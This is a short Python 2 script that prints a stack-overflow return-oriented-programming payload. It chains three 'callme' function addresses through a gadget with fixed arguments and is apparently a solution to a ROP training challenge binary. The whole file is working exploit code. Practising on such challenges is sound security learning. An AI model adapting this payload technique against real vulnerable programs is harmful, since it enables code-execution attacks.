# run with python2

import struct

callme1 = struct.pack("I", 0x080484f0)
callme2 = struct.pack("I", 0x08048550)
callme3 = struct.pack("I", 0x080484e0)

padding = "A" * 44

gadget = struct.pack("I", 0x08048496) # return function
arg1 = struct.pack("I", 0xdeadbeef) # args1
arg2 = struct.pack("I", 0xcafebabe) # args2
arg3 = struct.pack("I", 0xd00df00d) # args3

"""
callme(args1, args2. args3):
	...
	...
	...
	gadget
"""

args = gadget + arg1 + arg2 + arg3

payload = padding + callme1 + args + callme2 + args + callme3 + args

print(payload)
